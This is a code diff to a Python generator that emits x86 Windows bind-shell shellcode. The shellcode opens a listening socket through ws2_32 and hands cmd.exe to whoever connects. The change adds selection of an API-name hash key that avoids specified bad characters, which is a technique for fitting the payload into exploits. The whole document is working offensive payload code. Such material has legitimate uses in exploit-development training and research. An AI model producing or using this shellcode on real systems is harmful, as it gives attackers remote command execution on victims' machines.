@@ -1,6 +1,7 @@
 from coder.util import (
     convert_port_hex,
     find_and_call,
+    find_hash_key,
     find_kernel32,
     push_hash,
     push_string,
@@ -9,6 +10,19 @@ from coder.util import (
 
 def generate(port, bad_chars, no_terminate_process=False, debug=False):
     port_hex = convert_port_hex(port)
+    hash_key = find_hash_key(
+        [
+            "LoadLibraryA",
+            "WSAStartup",
+            "WSASocketA",
+            "bind",
+            "listen",
+            "accept",
+            "CreateProcessA",
+        ]
+        + ([] if no_terminate_process else ["TerminateProcess"]),
+        bad_chars,
+    )
 
     return f"""
     start:
@@ -21,12 +35,12 @@ def generate(port, bad_chars, no_terminate_process=False, debug=False):
     save_kernel32:
         mov   [ebp+0x14], ebx
 
-    {find_and_call()}
+    {find_and_call(hash_key)}
 
     load_ws2_32:                        // HMODULE LoadLibraryA([in] LPCSTR lpLibFileName);
         {push_string('ws2_32.dll', bad_chars)}
         push  esp                       // lpLibFileName = &("ws2_32.dll")
-        {push_hash('LoadLibraryA')}     // LoadLibraryA hash
+        {push_hash('LoadLibraryA', hash_key)}
         call dword ptr [ebp+0x04]       // Call LoadLibraryA
 
     save_ws2_32:
@@ -41,7 +55,7 @@ def generate(port, bad_chars, no_terminate_process=False, debug=False):
         xor   eax, eax                  // EAX = 0
         mov   ax, 0x0202                // Move version to AX
         push  eax                       // wVersionRequired = 0x202
-        {push_hash('WSAStartup')}       // WSAStartup hash
+        {push_hash('WSAStartup', hash_key)}
         mov   ebx, [ebp+0x18]           // Set WS2_32 Address
         call dword ptr [ebp+0x04]       // Call WSAStartup
 
@@ -56,7 +70,7 @@ def generate(port, bad_chars, no_terminate_process=False, debug=False):
         push  eax                       // type = 0x1
         inc   eax                       // Increase EAX, EAX = 0x02
         push  eax                       // af = 0x2
-        {push_hash('WSASocketA')}       // WSASocketA hash
+        {push_hash('WSASocketA', hash_key)}
         mov   ebx, [ebp+0x18]           // Set WS2_32 Address
         call dword ptr [ebp+0x04]       // Call WSASocketA
         mov   esi, eax                  // esi = sock
@@ -79,7 +93,7 @@ def generate(port, bad_chars, no_terminate_process=False, debug=False):
         push  eax                       // namelen = 0x10
         push  edi                       // addr = &(sockaddr_in)
         push  esi                       // s = sock
-        {push_hash('bind')}             // bind hash
+        {push_hash('bind', hash_key)}
         mov   ebx, [ebp+0x18]           // Set WS2_32 Address
         call dword ptr [ebp+0x04]       // Call bind
 
@@ -87,7 +101,7 @@ def generate(port, bad_chars, no_terminate_process=False, debug=False):
         xor   eax, eax                  // eax = 0
         push  eax                       // backlog = 0
         push  esi                       // s = sock
-        {push_hash('listen')}           // listen hash
+        {push_hash('listen', hash_key)}
         mov   ebx, [ebp+0x18]           // Set WS2_32 Address
         call dword ptr [ebp+0x04]       // Call listen
 
@@ -96,7 +110,7 @@ def generate(port, bad_chars, no_terminate_process=False, debug=False):
         push  eax                       // addrlen = 0
         push  eax                       // addr = 0
         push  esi                       // s = sock
-        {push_hash('accept')}           // accept hash
+        {push_hash('accept', hash_key)}
         mov   ebx, [ebp+0x18]           // Set WS2_32 Address
         call dword ptr [ebp+0x04]       // Call accept
         mov   esi, eax                  // esi = accept()
@@ -139,7 +153,7 @@ def generate(port, bad_chars, no_terminate_process=False, debug=False):
         push  eax                       // lpProcessAttributes = NULL
         push  ebx                       // lpCommandLine = &("cmd.exe")
         push  eax                       // lpApplicationName = NULL
-        {push_hash('CreateProcessA')}   // CreateProcessA hash
+        {push_hash('CreateProcessA', hash_key)}
         mov   ebx, [ebp+0x14]           // Set Kernel32 Address
         call dword ptr [ebp+0x04]       // Call CreateProcessA
 
@@ -149,7 +163,7 @@ def generate(port, bad_chars, no_terminate_process=False, debug=False):
         xor   ecx, ecx                  // ECX = 0
         push  ecx                       // uExitCode = 0
         push  0xffffffff                // hProcess = 0xffffffff
-        {push_hash('TerminateProcess')} // TerminateProcess hash
+        {push_hash('TerminateProcess', hash_key)}
         mov   ebx, [ebp+0x14]           // Set Kernel32 Address
         call dword ptr [ebp+0x04]       // Call TerminateProcess
     ''' if not no_terminate_process else ''
